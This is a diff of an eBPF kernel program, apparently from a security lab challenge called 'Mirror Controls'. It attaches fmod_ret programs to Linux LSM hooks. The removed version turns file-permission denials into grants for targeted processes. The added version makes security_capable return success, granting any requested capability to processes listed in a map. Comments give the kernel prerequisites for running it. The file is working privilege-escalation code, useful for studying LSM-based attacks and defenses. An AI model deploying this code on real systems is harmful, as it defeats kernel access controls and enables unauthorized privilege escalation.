@@ -1,13 +1,14 @@
-// ch01 Mirror Controls — REAL mutation via BPF LSM fmod_ret.
+// ch01 Mirror Controls — REAL mutation variant using BPF LSM fmod_ret.
 //
-// Hooks lsm/inode_permission (called on vfs_read / vfs_write) and flips
-// -EACCES to 0 for targeted tgids. This hook fires reliably on kernel
-// 6.14+ where security_capable bypasses the LSM chain for non-root
-// processes.
+// On a kernel built with CONFIG_BPF_LSM=y and booted with `lsm=bpf,...` in
+// the cmdline, this program overrides `security_capable` to return 0 (cap
+// granted) for tgids in the target_tgids map. Unlike the kprobe-based
+// variant, fmod_ret on LSM hooks is NOT gated by the error_injection
+// allowlist — LSM is the first-class override primitive.
 //
-// Demonstrates: BPF LSM can override file access denials at the VFS
-// level, granting read/write to files the process would otherwise be
-// blocked from.
+// Verify prerequisites on the host before running:
+//   cat /sys/kernel/security/lsm      # must contain "bpf"
+//   bpftool feature probe | grep lsm  # must show "lsm_fmod_ret ok"
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
@@ -18,11 +19,9 @@ char LICENSE[] SEC("license") = "GPL";
 struct evt {
     unsigned int pid, tgid;
     char comm[16];
-    int hook;       // 1=file_permission
+    int cap;
     int orig_ret;
     int flipped;
-    int mask;       // MAY_READ=4, MAY_WRITE=2
-    char fname[32];
 };
 
 struct {
@@ -37,65 +36,40 @@ struct {
     __uint(max_entries, 1024);
 } target_tgids SEC(".maps");
 
-static __always_inline int is_target(void)
+// lsm/capable fmod_ret: signature must match
+//   int security_capable(const struct cred *cred, struct user_namespace *ns,
+//                        int cap, unsigned int opts)
+// Return value: 0 = allow, -EPERM = deny. We intercept the ret arg and rewrite.
+SEC("lsm.s/capable")
+int BPF_PROG(lsm_capable,
+             const struct cred *cred,
+             struct user_namespace *ns,
+             int cap,
+             unsigned int opts,
+             int ret)
 {
     unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
     unsigned int *hit = bpf_map_lookup_elem(&target_tgids, &tgid);
     unsigned int zero = 0;
-    return (hit || bpf_map_lookup_elem(&target_tgids, &zero)) ? 1 : 0;
-}
+    int is_target = (hit || bpf_map_lookup_elem(&target_tgids, &zero)) ? 1 : 0;
 
-// int security_inode_permission(struct inode *inode, int mask)
-// fmod_ret: return 0 to allow, -EACCES to deny.
-// This is the key LSM hook called by do_inode_permission() — fires
-// BEFORE the DAC check returns, and BPF's return overrides.
-SEC("lsm/inode_permission")
-int BPF_PROG(lsm_inode_permission, struct inode *inode, int mask, int ret)
-{
-    if (!is_target())
-        return ret;
-
-    // Skip root (uid 0) — flipping root denials breaks system services.
-    // Only flip for non-root targeted processes.
-    unsigned long long uid_gid = bpf_get_current_uid_gid();
-    unsigned int uid = uid_gid & 0xffffffff;
-    if (uid == 0)
-        return ret;
-
-    // Only flip access-control denials (-EACCES, -EPERM). Other LSMs
-    // earlier in the chain can return -EROFS, -ENAMETOOLONG, -EIO,
-    // -ESTALE, etc. — flipping those to 0 hides legitimate errors
-    // unrelated to the attacker's goal and breaks filesystem semantics.
-    int flipped = 0;
     int new_ret = ret;
-    if (ret == -13 /* -EACCES */ || ret == -1 /* -EPERM */) {
-        new_ret = 0;  // flip denial to allow
+    int flipped = 0;
+    if (is_target && ret != 0) {
+        new_ret = 0;      // real mutation: deny -> grant
         flipped = 1;
     }
 
-    // Only emit events on actual flips to avoid flooding the ringbuf
-    // (inode_permission fires thousands of times per second).
-    if (flipped) {
-        struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
-        if (e) {
-            unsigned long id = bpf_get_current_pid_tgid();
-            e->pid = id & 0xffffffff;
-            e->tgid = id >> 32;
-            bpf_get_current_comm(&e->comm, sizeof(e->comm));
-            e->hook = 1;
-            e->orig_ret = ret;
-            e->flipped = flipped;
-            e->mask = mask;
-            struct hlist_node *first = BPF_CORE_READ(inode, i_dentry.first);
-            if (first) {
-                struct dentry *dent = (struct dentry *)((char *)first -
-                    __builtin_offsetof(struct dentry, d_u.d_alias));
-                const unsigned char *name = BPF_CORE_READ(dent, d_name.name);
-                if (name)
-                    bpf_probe_read_kernel_str(&e->fname, sizeof(e->fname), name);
-            }
-            bpf_ringbuf_submit(e, 0);
-        }
+    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
+    if (e) {
+        unsigned long id = bpf_get_current_pid_tgid();
+        e->pid = id & 0xffffffff;
+        e->tgid = tgid;
+        bpf_get_current_comm(&e->comm, sizeof(e->comm));
+        e->cap = cap;
+        e->orig_ret = ret;
+        e->flipped = flipped;
+        bpf_ringbuf_submit(e, 0);
     }
     return new_ret;
 }
